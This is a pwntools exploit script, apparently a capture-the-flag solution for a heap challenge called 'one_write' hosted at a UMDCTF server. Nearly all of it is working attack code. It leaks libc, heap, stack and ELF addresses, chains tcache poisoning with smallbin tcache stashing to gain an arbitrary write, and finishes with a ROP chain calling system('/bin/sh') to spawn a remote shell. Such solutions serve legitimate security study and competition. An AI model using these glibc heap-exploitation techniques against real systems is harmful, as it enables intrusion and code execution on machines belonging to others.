from pwn import *

path = "./one_write"
e = context.binary = ELF(path)
libc = ELF("./libc.so.6")

#p = process(path)
#p = gdb.debug(path, '''
#    c
#''')

p = remote("challs.umdctf.io", 31727)

def numb(num):
    return str(num).encode('ascii')

def alloc(idx, size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', numb(idx))
    p.sendlineafter(b'size: ', numb(size))

def free(idx, size):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', numb(idx))
def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', numb(idx))
def write(data):
    p.sendlineafter(b'> ', b'3')
    p.sendafter(b'data: ', data)
def read():
    p.sendlineafter(b'> ', b'4')
    return p.recvuntil(b'1. Alloc', drop=True)

# leak libc ezpz from unsorted bin
alloc(0, 0x420-8)
alloc(1, 0x420-8)
free(0)
free(1)
data = read()
leak = u64(data[:8])
libc.address = leak - (0x72b5dc403b20 - 0x72b5dc200000)
log.info(f"libc leak: 0x{leak:x}")
log.info(f"libc base: 0x{libc.address:x}")

# leak heap
alloc(0, 0x100-8)
free(0)
data = read()
heap = u64(data[:8]) << 12
log.info(f"heap base: 0x{heap:x}")


# tcache poisoning to get __libc_argv into tcache head
alloc(0, 0x100-8)
alloc(1, 0x100-8)
free(1)
free(0)
write(p64(libc.symbols['__libc_argv'] ^ (heap >> 12)))

alloc(0, 0x100-8)
alloc(1, 0x100-8)

# tcache head now contains masked contents of __libc_argv
# we can free a tcache chunk to reveal them
# however, we have to undo both masks
free(0)
leak = u64(read()[:8])
stack = leak ^ (heap >> 12) ^ (libc.symbols['__libc_argv'] >> 12)
log.info(f"stack leak: 0x{stack:x}")

# repeat the above technique to leak ELF
leak_addr = stack - (0x7fff2b9bc7c8 - 0x7fff2b9bc780)
alloc(0, 0x100-8)
alloc(1, 0x100-8)
free(1)
free(0)
write(p64(leak_addr ^ (heap >> 12)))
alloc(0, 0x100-8)
alloc(1, 0x100-8)
free(0)
leak = u64(read()[:8])
start_addr = leak ^ (heap >> 12) ^ (leak_addr >> 12)
e.address = start_addr - e.symbols['_start']
log.info(f"elf base: 0x{e.address:x}")

# use smallbin tcache stashing to get arbitrary write on the_chunk variable
#
# setup is:
# * empty tcache, but w/ target value as head
#   * target value should be xor'd w/ (&the_chunk >> 12)
# * smallbin with poisoned bk pointing to the_chunk-8
#   * acquired by doing smallbin stashing of 7 chunks which lets us set bin->bk
#
alloc(0, 0x100-8)

# fill tcache so we can put stuff in fastbin
for i in range(7):
    alloc(8 + i, 0x100-8)
for i in range(7):
    free(8 + i)

free(0)
alloc(0, 0x200-8) # put chunk we just freed into smallbin

# need to create pointer chain of length 8
# first chunk is returned, the rest stashed
fd = heap + 0x280
bk = heap + 0x2a0
payload = b""
for i in range(7):
    payload += p64(fd + 0x10 * i) + p64(bk + 0x10 * i)
payload += p64(0) + p64(e.symbols['the_chunk']-0x10)
write(payload)

# remove chunks from tcache so we can do stashing
for i in range(7):
    alloc(8 + i, 0x100-8)

alloc(0, 0x100-8)

# remove chunks from tcache so we can do stashing again
for i in range(7):
    alloc(8 + i, 0x100-8)

smallbin_addr = libc.symbols['main_arena']+336

payload = b''
for i in range(8):
    payload += p64(smallbin_addr + 0x10 * (i - 2)) + p64(smallbin_addr + 0x10 * (i))
payload += p64(0) + p64(e.symbols['the_chunk']-8)
write(payload)

alloc(0, 0xf0-8)

# remove chunks from tcache so we can do stashing YET AGAIN
for i in range(7):
    alloc(8 + i, 0xf0-8)

# we have to use 0xf0 smallbin for stashing, because otherwise the_chunk->fd == bin
# will cause problems
# this means we have to set up 0xf0 tcache with the empty tcache w/ non-null head

# 0xf0 smallbin (addr writing to = smallbin_addr)
payload = p64(smallbin_addr+0x10) + p64(smallbin_addr+0x30) 

payload += p64(0) + p64(0xf1) # smallbin_addr + 0x10 chunk
payload += p64(smallbin_addr+0x30) + p64(smallbin_addr-0x10)

payload += p64(0) + p64(0xf1) # smallbin_addr + 0x30 chunk
payload += p64(smallbin_addr-0x10) + p64(smallbin_addr+0x10)

write(payload)
alloc(0, 0xf0-8)

# final target address for the_chunk to be set to
target_addr = stack - (0x7ffe8439a578 - 0x7ffe8439a448)
log.info(f"target addr: 0x{target_addr:x}")

# empty-poison 0xf0 tcache
payload = b'A' * 16
payload += p64(0) + p64(0xf1)
payload += p64(target_addr ^ ((smallbin_addr + 0x20) >> 12) ^ (e.symbols['the_chunk'] >> 12)) + p64(0)
write(payload)
alloc(0, 0xf0-8)

# this is the last tcache stashing, where we finally overwrite the_chunk
# smallbin bk chain looks like:
# bin -> fake_chunk -> &the_chunk -> bin
# importantly, &the_chunk->fd point to fake_chunk (at smallbin_addr)<
# which passes security check
payload = p64(0x4141414141414141) + p64(smallbin_addr)
payload += p64(0) + p64(e.symbols['the_chunk']-0x10)
write(payload)
alloc(0, 0xf0-8)

# now we can just write a ropchain
# this will overwrite return address of write and give us shell wahoo
pop_rdi = libc.address + 0x10f75b
ret = pop_rdi + 1
binsh = next(libc.search(b'/bin/sh\0'))

payload = p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc.symbols['system'])
write(payload)

p.interactive()
